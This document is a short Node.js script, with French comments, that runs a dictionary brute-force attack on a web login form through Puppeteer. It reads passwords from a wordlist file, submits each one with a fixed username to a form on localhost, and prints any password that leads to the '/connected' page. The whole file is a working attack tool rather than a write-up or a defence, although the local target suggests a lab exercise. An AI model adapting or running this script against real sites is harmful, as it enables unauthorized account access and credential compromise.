const fs = require('fs');
const readline = require('readline');
const puppeteer = require('puppeteer');

const rs = fs.createReadStream('dictionnaire.txt', {encoding:'utf8', flag:'r'});
const rl = readline.createInterface({ input: rs });

(async () => {
	for await (const passwordBrute of rl) {
		// Read a password from dictionary
		const validPassword = await checkPassword(passwordBrute);
		if(validPassword) console.log('VALID PASSWORD FOUND :::: ', passwordBrute);
		//await pause(200); // Repos en millisecondes
	}
})();

const pause = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const checkPassword = async ( randomPassword ) => {
	// Access application form "localhost:9999"
	const browser = await puppeteer.launch();
	const page = await browser.newPage();
	await page.goto('http://localhost:9999');
	
	// Fill username correct username ''
	await page.type('#username', 'Oumy_96');
  
	// Submit form with given randomPassword
	await page.type('#password', randomPassword);
    await page.keyboard.press('Enter');
	
	// Check if connected
	await page.waitForNavigation();
	if (page.url() === 'http://localhost:9999/connected') {
		await browser.close();
		return true
	};
	
	browser.close();
	return false;
}